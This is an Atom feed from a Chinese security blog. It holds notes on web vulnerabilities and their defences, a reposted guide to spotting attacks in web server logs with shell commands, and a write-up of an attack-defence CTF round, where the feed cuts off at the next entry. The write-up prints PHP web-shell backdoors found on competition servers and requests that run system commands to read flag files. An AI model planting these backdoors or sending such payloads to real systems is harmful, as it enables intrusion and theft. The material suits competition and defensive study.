<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>vQAQv&#39;s blog | Just Do It!</title>
  
  <subtitle>To Be A Better Man</subtitle>
  <link href="https://cr4ckm3.top/atom.xml" rel="self"/>
  
  <link href="https://cr4ckm3.top/"/>
  <updated>2021-09-01T03:37:48.272Z</updated>
  <id>https://cr4ckm3.top/</id>
  
  <author>
    <name>vQAQv</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>《Vulnerability box》gitbook笔记</title>
    <link href="https://cr4ckm3.top/2019/08/30/%E5%90%84%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    <id>https://cr4ckm3.top/2019/08/30/%E5%90%84%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/</id>
    <published>2019-08-30T10:00:45.023Z</published>
    <updated>2021-09-01T03:37:48.272Z</updated>
    
    <content type="html"><![CDATA[<p>Vulnerability box 笔记</p><span id="more"></span><h2 id="0x00-SQL注入漏洞"><a href="#0x00-SQL注入漏洞" class="headerlink" title="0x00 SQL注入漏洞"></a>0x00 SQL注入漏洞</h2><h3 id="漏洞简述："><a href="#漏洞简述：" class="headerlink" title="漏洞简述："></a>漏洞简述：</h3><p>SQL注入漏洞是因为网站应用程序在编写时未对用户提交至服务器的数据进行校验，没有有效的对特殊字符过滤。</p><h3 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h3><ul><li>对用户数据进行严格过滤</li><li>防火墙</li><li>数据库操作监控</li><li>正则过滤</li></ul><h2 id="0x01-目录遍历漏洞"><a href="#0x01-目录遍历漏洞" class="headerlink" title="0x01 目录遍历漏洞"></a>0x01 目录遍历漏洞</h2><h3 id="漏洞简述：-1"><a href="#漏洞简述：-1" class="headerlink" title="漏洞简述："></a>漏洞简述：</h3><p>获取系统文件及服务器配置文件，利用服务器API、文件标准权限进行攻击。</p><h3 id="防御：-1"><a href="#防御：-1" class="headerlink" title="防御："></a>防御：</h3><ul><li>修改配置文件</li><li>设置目录权限</li><li>每个目录下创建一个控的index.html</li></ul><h2 id="0x02-跨站脚本漏洞-xss漏洞"><a href="#0x02-跨站脚本漏洞-xss漏洞" class="headerlink" title="0x02 跨站脚本漏洞(xss漏洞)"></a>0x02 跨站脚本漏洞(xss漏洞)</h2><h3 id="漏洞简述：-2"><a href="#漏洞简述：-2" class="headerlink" title="漏洞简述："></a>漏洞简述：</h3><p>利用漏洞在网站中插入恶意代码，它能够获取网站管理员或其他用户的cookie，隐蔽运行网页木马，权限大的甚至可以做出更大的操作。</p><h4 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h4><ul><li>钓鱼，盗取隐私信息。</li><li>传播脚本蠕虫，网页挂马。</li><li>劫持用户会话，利用用户身份进行恶意操作。<h2 id="防御：-2"><a href="#防御：-2" class="headerlink" title="防御："></a>防御：</h2></li><li>编码转义</li><li>xss filter 黑白名单</li><li>处理富文本(限制只能使用安全标签)</li><li>设置Httponly</li></ul><h2 id="0x03-跨站请求伪造漏洞-csrf漏洞"><a href="#0x03-跨站请求伪造漏洞-csrf漏洞" class="headerlink" title="0x03 跨站请求伪造漏洞(csrf漏洞)"></a>0x03 跨站请求伪造漏洞(csrf漏洞)</h2><h3 id="漏洞简述：-3"><a href="#漏洞简述：-3" class="headerlink" title="漏洞简述："></a>漏洞简述：</h3><p>攻击者通过伪造来自受信任用户的请求，达到增、删、改网站内容的目的。<br>攻击者冒充用户/管理员，伪造请求，进行篡改、转帐、改密码、发邮件等非法操作</p><h3 id="防御：-3"><a href="#防御：-3" class="headerlink" title="防御："></a>防御：</h3><ul><li>过滤用户输入，不允许发布含有站内操作URL的链接</li><li>在浏览其它站点前登出站点或者在浏览器会话结束后清理浏览器的cookie</li><li>对于web站点，将持久化的授权方法（例如cookie或者HTTP授权）切换为瞬时的授权方法（在每个form中提供隐藏field）</li><li>关键操作使用验证码,只接受 POST 请求，GET请求应该只浏览而不改变服务器端资源<h3 id="服务端的防御："><a href="#服务端的防御：" class="headerlink" title="服务端的防御："></a>服务端的防御：</h3></li><li>验证HTTP Referer字段。</li><li>请求地址中添加token并验证（token不放在cookie中，放在http请求参数中，服务端对其进行验证）</li><li>将token加入http头属性中，避免了token出现在浏览器中，被泄露。<h3 id="客户端防御："><a href="#客户端防御：" class="headerlink" title="客户端防御："></a>客户端防御：</h3></li><li>为了配合服务端对token的验证，那么客户端也需要在访问时生成token，这是利用 js 来给 html 中的链接和表单请求地址附加 csrftoken 代码，其中已定义 token 为全局变量，其值可以从 session 中得到。</li></ul><h2 id="0x04-URL-重定向漏洞-URL跳转"><a href="#0x04-URL-重定向漏洞-URL跳转" class="headerlink" title="0x04 URL 重定向漏洞(URL跳转)"></a>0x04 URL 重定向漏洞(URL跳转)</h2><h3 id="漏洞简述：-4"><a href="#漏洞简述：-4" class="headerlink" title="漏洞简述："></a>漏洞简述：</h3><p>returnURL修改为指向恶意站点，攻击者可以发起网络钓鱼，因窃取用户凭证。</p><h3 id="防御：-4"><a href="#防御：-4" class="headerlink" title="防御："></a>防御：</h3><ul><li>web应用防火墙</li><li>对用户的输入进行严格过滤</li></ul><h2 id="0x05-文件上传漏洞"><a href="#0x05-文件上传漏洞" class="headerlink" title="0x05 文件上传漏洞"></a>0x05 文件上传漏洞</h2><h3 id="漏洞简述：-5"><a href="#漏洞简述：-5" class="headerlink" title="漏洞简述："></a>漏洞简述：</h3><p>存在任意上传，上传没有限制文件格式，被恶意上传webshell文件。</p><h3 id="防御：-5"><a href="#防御：-5" class="headerlink" title="防御："></a>防御：</h3><ul><li>对上传文件格式进行严格校验及安全扫描，防止上传恶意脚本文件</li><li>严格限制可上传的文件类型</li><li>严格限制上传的文件路径</li><li>文件内容服务端校验</li><li>设置权限限制，禁止上传目录的执行权限</li><li>上传文件重命名</li></ul><h2 id="0x06-Unicode-编码转换漏洞"><a href="#0x06-Unicode-编码转换漏洞" class="headerlink" title="0x06 Unicode 编码转换漏洞"></a>0x06 Unicode 编码转换漏洞</h2><h3 id="漏洞简述：-6"><a href="#漏洞简述：-6" class="headerlink" title="漏洞简述："></a>漏洞简述：</h3><p>Unicode在编码转换过程中会忽略某些字符，导致攻击者可拆分攻击关键字等字符绕过安全设备的检测。</p><h3 id="防御：-6"><a href="#防御：-6" class="headerlink" title="防御："></a>防御：</h3><ul><li>修改中间件、过滤某些字符</li><li>web应用层防火墙</li></ul><h2 id="0x07-旁站攻击漏洞"><a href="#0x07-旁站攻击漏洞" class="headerlink" title="0x07 旁站攻击漏洞"></a>0x07 旁站攻击漏洞</h2><h1 id="参考来自"><a href="#参考来自" class="headerlink" title="参考来自"></a>参考来自</h1><p><a href="https://book.thief.one/">nMask–&gt;Vulnerability box</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Vulnerability box 笔记&lt;/p&gt;</summary>
    
    
    
    
    <category term="笔记" scheme="https://cr4ckm3.top/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Web日志安全分析技巧(转)</title>
    <link href="https://cr4ckm3.top/2019/07/05/Apache_Web%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    <id>https://cr4ckm3.top/2019/07/05/Apache_Web%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</id>
    <published>2019-07-04T16:00:00.000Z</published>
    <updated>2019-08-30T10:00:43.483Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web日志安全分析技巧"><a href="#Web日志安全分析技巧" class="headerlink" title="Web日志安全分析技巧"></a><p style="text-align: center;">Web日志安全分析技巧</p></h1><p>Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p><span id="more"></span><h2 id="0x01-Web日志"><a href="#0x01-Web日志" class="headerlink" title="0x01  Web日志"></a>0x01  Web日志</h2><p>我们来看一条Apache的访问日志：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> - - [<span class="number">11</span>/Jun/<span class="number">2018</span>:<span class="number">12</span>:<span class="number">47</span>:<span class="number">22</span> +<span class="number">0800</span>] &quot;GET /login.html HTTP/<span class="number">1</span>.<span class="number">1</span>&quot; <span class="number">200</span> <span class="number">786</span> &quot;-&quot; &quot;Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; WOW64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">66</span>.<span class="number">0</span>.<span class="number">3359</span>.<span class="number">139</span> Safari/<span class="number">537</span>.<span class="number">36</span>&quot;</span><br></pre></td></tr></table></figure><p>通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。</p><p>本文通过介绍Web日志安全分析时的思路和常用的一些技巧。</p><h2 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h2><p>在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。</p><p>第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p><p>第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。</p><p>常用分析工具：</p><p>Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p><p>Linux下，使用Shell命令组合查询分析。</p><p>Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。</p><p>Apache日志分析技巧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1、列出当天访问次数最多的IP命令：</span><br><span class="line">cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</span><br><span class="line"></span><br><span class="line">2、查看当天有多少个IP访问：</span><br><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> log_file|sort|uniq|wc -l</span><br><span class="line"></span><br><span class="line">3、查看某一个页面被访问的次数：</span><br><span class="line">grep <span class="string">&quot;/index.php&quot;</span> log_file | wc -l</span><br><span class="line"></span><br><span class="line">4、查看每一个IP访问了多少个页面：</span><br><span class="line">awk <span class="string">&#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27;</span> log_file</span><br><span class="line"></span><br><span class="line">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class="line">awk <span class="string">&#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#x27;</span> log_file | sort -n</span><br><span class="line"></span><br><span class="line">6、查看某一个IP访问了哪些页面：</span><br><span class="line">grep ^111.111.111.111 log_file| awk <span class="string">&#x27;&#123;print $1,$7&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">7、去掉搜索引擎统计当天的页面：</span><br><span class="line">awk <span class="string">&#x27;&#123;print $12,$1&#125;&#x27;</span> log_file | grep ^\&quot;Mozilla | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> |sort | uniq | wc -l</span><br><span class="line"></span><br><span class="line">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class="line">awk <span class="string">&#x27;&#123;print $4,$1&#125;&#x27;</span> log_file | grep 21/Jun/2018:14 | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>| sort | uniq | wc -l</span><br><span class="line"></span><br><span class="line">9、在未有系统，且日志量不大时可以采用对accesslog进行uri、ip等top10罗列，具体作用用于分析是否存在恶意ip、哪个接口访问过高等维度。</span><br><span class="line">awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> access.log | sort -n |uniq -c | sort -rn | head -n 10</span><br></pre></td></tr></table></figure><h2 id="0x03-日志分析案例"><a href="#0x03-日志分析案例" class="headerlink" title="0x03 日志分析案例"></a>0x03 日志分析案例</h2><p>Web日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。</p><p>在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？</p><p>这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。</p><p>1、定位攻击源</p><p>首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。</p><p>浏览器指纹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)</span><br></pre></td></tr></table></figure><p>2、搜索相关日志记录</p><p>通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。</p><p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A、攻击者访问首页和登录页</span><br><span class="line">B、攻击者访问MsgSjlb.aspx和MsgSebd.aspx</span><br><span class="line">C、攻击者访问Xzuser.aspx</span><br><span class="line">D、攻击者多次POST（怀疑通过这个页面上传模块缺陷）</span><br><span class="line">E、攻击者访问了图片木马</span><br></pre></td></tr></table></figure><p>打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。</p><h2 id="0x04-日志统计分析技巧"><a href="#0x04-日志统计分析技巧" class="headerlink" title="0x04 日志统计分析技巧"></a>0x04 日志统计分析技巧</h2><blockquote><p>查看Auth.log,检查SSH是否被扫</p></blockquote><p>查看用密码登陆成功的IP地址及次数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Accepted password for root&quot;</span> /var/<span class="built_in">log</span>/auth.log | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure><p>查看用密码登陆失败的IP地址及次数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /var/<span class="built_in">log</span>/auth.log | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure><p>统计爬虫：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E <span class="string">&#x27;Googlebot|Baiduspider&#x27;</span>  /www/logs/access.2019-02-23.log | awk <span class="string">&#x27;&#123; print $1 &#125;&#x27;</span> | sort | uniq</span><br></pre></td></tr></table></figure><p>统计浏览器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access.2019-02-23.log | grep -v -E <span class="string">&#x27;MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon&#x27;</span> | sort | uniq -c | sort -r -n | head -n 100</span><br></pre></td></tr></table></figure><p>IP 统计：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;23/May/2019&#x27;</span> /www/logs/access.2019-02-23.log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | awk -F<span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&#x27;</span> | sort | uniq -c | sort -r -n | head -n 10</span><br><span class="line">   2206 219.136.134.13</span><br><span class="line">   1497 182.34.15.248</span><br><span class="line">   1431 211.140.143.100</span><br><span class="line">   1431 119.145.149.106</span><br><span class="line">   1427 61.183.15.179</span><br><span class="line">   1427 218.6.8.189</span><br><span class="line">   1422 124.232.150.171</span><br><span class="line">   1421 106.187.47.224</span><br><span class="line">   1420 61.160.220.252</span><br><span class="line">   1418 114.80.201.18</span><br></pre></td></tr></table></figure><p>统计网段：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access.2019-02-23.log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | awk -F<span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.0&quot;&#125;&#x27;</span> | sort | uniq -c | sort -r -n | head -n 200  </span><br></pre></td></tr></table></figure><p>统计域名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access.2019-02-23.log |awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><p>HTTP 状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access.2019-02-23.log |awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br><span class="line">5056585 304</span><br><span class="line">1125579 200</span><br><span class="line">   7602 400</span><br><span class="line">      5 301</span><br></pre></td></tr></table></figure><p>URL 统计：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access.2019-02-23.log |awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><p>文件流量统计：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access.2019-02-23.log |awk <span class="string">&#x27;&#123;sum[$7]+=$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;&#x27;</span>|sort -rn|more</span><br><span class="line">grep <span class="string">&#x27; 200 &#x27;</span> /www/logs/access.2019-02-23.log |awk <span class="string">&#x27;&#123;sum[$7]+=$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;&#x27;</span>|sort -rn|more</span><br></pre></td></tr></table></figure><p>URL访问量统计：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access.2019-02-23.log | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | egrep <span class="string">&#x27;\?|&amp;&#x27;</span> | sort | uniq -c | sort -rn | more</span><br></pre></td></tr></table></figure><p>脚本运行速度：</p><p>查出运行速度最慢的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v 0$ /www/logs/access.2019-02-23.log | awk -F <span class="string">&#x27;\&quot; &#x27;</span> <span class="string">&#x27;&#123;print $4&quot; &quot; $1&#125;&#x27;</span> web.log | awk <span class="string">&#x27;&#123;print $1&quot; &quot;$8&#125;&#x27;</span> | sort -n -k 1 -r | uniq &gt; /tmp/slow_url.txt</span><br></pre></td></tr></table></figure><p>IP, URL 抽取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f /www/logs/access.2019-02-23.log | grep <span class="string">&#x27;/test.html&#x27;</span> | awk <span class="string">&#x27;&#123;print $1&quot; &quot;$7&#125;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>转载来源</li></ul><p><a href="https://mp.weixin.qq.com/s/CtnHy9X7_csTwrG5KJvDjg">Bypass微信公众号-Web日志安全分析技巧</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Web日志安全分析技巧&quot;&gt;&lt;a href=&quot;#Web日志安全分析技巧&quot; class=&quot;headerlink&quot; title=&quot;Web日志安全分析技巧&quot;&gt;&lt;/a&gt;&lt;p style=&quot;text-align: center;&quot;&gt;Web日志安全分析技巧&lt;/p&gt;&lt;/h1&gt;&lt;p&gt;Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。&lt;/p&gt;</summary>
    
    
    
    
    <category term="日志分析" scheme="https://cr4ckm3.top/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>一些PHP代码分析学习笔记</title>
    <link href="https://cr4ckm3.top/2019/07/05/%E4%B8%80%E4%BA%9Bphp%E7%AC%94%E8%AE%B0/"/>
    <id>https://cr4ckm3.top/2019/07/05/%E4%B8%80%E4%BA%9Bphp%E7%AC%94%E8%AE%B0/</id>
    <published>2019-07-04T16:00:00.000Z</published>
    <updated>2019-08-30T10:00:44.793Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="abca0a1d38efbba20e84d44ec59760921699ace4dd52e3cb8ea36e54311c1a47"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">QAQ密码是什么啊!</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密的文章,需要输入密码阅读.</summary>
    
    
    
    
    <category term="CTF" scheme="https://cr4ckm3.top/tags/CTF/"/>
    
    <category term="php" scheme="https://cr4ckm3.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>红帽杯线下赛总结</title>
    <link href="https://cr4ckm3.top/2018/05/28/redhat_awd/"/>
    <id>https://cr4ckm3.top/2018/05/28/redhat_awd/</id>
    <published>2018-05-27T16:00:00.000Z</published>
    <updated>2019-08-30T10:00:41.103Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><h2 id="正常思路："><a href="#正常思路：" class="headerlink" title="正常思路："></a>正常思路：</h2><p>连接ssh–&gt;sftp打包网站备份–&gt;找漏洞/内置后门–&gt;修复漏洞/删除后门/利用漏洞批量获取flag–&gt;批量自动提交</p><p>开始拿到服务器，发现是wp,就找配置文件。包含我的通防和log记录文件。<br>第一个一打开就是：<code>/var/www/html/wp-config.php</code><br>看到如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一行:</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(md5(<span class="variable">$_POST</span>[a])===<span class="string">&#x27;一串MD5&#x27;</span>)&#123;show_source(<span class="string">&#x27;/flag&#x27;</span>);@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[b]);&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本以为是官方内置后门，但是32位的爆破又不太可能。。。所以后来也有人说是被人植入的后门。这速度快的。。。。惊了！</p><p>发现没有开放sftp协议以及没有权限执行tar打包文件。还可以利用scp命令进行ssh远程登陆文件拷贝。</p><p>然后在短短的几分钟内有人拿了一血。</p><p>尝试读取apache日志：<code>/var/log/apache2/access.log </code><br>发现<code>python-requests</code>的请求头。发现异常<br>请求uri:<br><code>/wp-content/upgrade/.web01.php?guo=d1and3ngzh3</code>(点灯者的shell)</p><p>所以到<code>/wp-content/upgrade/.web01.php </code><br>发现：<code>&lt;?php @eval($_POST[&#39;power&#39;]);?&gt;</code></p><p>所以抄答案即可拿到flag。<code>所以一开始就已经开始得分了</code>,记得当时没得分的排名时20,写完脚本,想自动提交时掉到30多,过程中很多轮一直没有提交flag,丢了很多分。这是最不应该的一点。<br>从一开始的50多支队伍的flag到最后只剩8支队伍。</p><p>后来还找到很多的 payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">web 1 wordpress  </span><br><span class="line">/wp-content/upgrade/下有shell。</span><br><span class="line">/wp-config.php里有别人的shell。</span><br><span class="line">/wp-login.php有debug模式可以rce</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/wp-login.php?redirect_to=http%3A%2F%2F172.16.5.69%2Fwp-admin%2Ftools.php&amp;reauth=1 HTTP/1.0&quot; 200 3147 &quot;/home/babyblog/flag/flag&quot; &quot;python-requests/2.18.4&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/wp-admin/tools.php</span><br><span class="line"></span><br><span class="line">/wp-admin/tools.php?cmd=system(%22cat%20flag%22);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> /</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">admin=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><h2 id="文件修改："><a href="#文件修改：" class="headerlink" title="文件修改："></a>文件修改：</h2><p><code>www-data</code>大于<code>ctfuser</code>的权限。所以ssh连上去的权限修改不了 www-data </p><p>发现没有权限修改被写进来的shell,都是’不死马+内存马’,所以不重启apache服务器是删不掉的。<br>    一个骚操作就是：利用他们的马，<code>写一个文件上传点</code>,然后再上传<code>同文件名</code>的正常的文件,替换掉有问题的文件。</p><h2 id="失误点"><a href="#失误点" class="headerlink" title="失误点:"></a>失误点:</h2><p>在写自动化脚本时出现SSL证书问题，导致浪费大量时间。最后加上(verify=False)忽略认证可解决。</p><p>主办方设置了3s 才能提交一次，这是另外失误的一点。</p><p>所以最后是每一轮都手动提交flag。。。(早知就一开始就收到提交了</p><h1 id="web2"><a href="#web2" class="headerlink" title="web2:"></a>web2:</h1><p>同事抓到log是finecms的cookie的反序列化漏洞。</p><p>把一个cookie反序列化payload给我,我在打web1+专心打代码+现场的音效有点大。没听到是web2的payload。所以拿去打web1了。= =。我的锅。</p><p>web2我们防的挺好的。就中途莫名down机一次。然后请求重置服务器，然后迅速补洞，就没丢过分了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web1&quot;&gt;&lt;a href=&quot;#web1&quot; class=&quot;headerlink&quot; title=&quot;web1&quot;&gt;&lt;/a&gt;web1&lt;/h1&gt;&lt;h2 id=&quot;正常思路：&quot;&gt;&lt;a href=&quot;#正常思路：&quot; class=&quot;headerlink&quot; title=&quot;正常思路：&quot;&gt;</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://cr4ckm3.top/tags/CTF/"/>
    
    <category term="AWD" scheme="https://cr4ckm3.top/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>php文件包含</title>
    <link href="https://cr4ckm3.top/2018/05/24/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>https://cr4ckm3.top/2018/05/24/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2018-05-24T03:00:00.000Z</published>
    <updated>2019-08-30T10:00:42.323Z</updated>
    
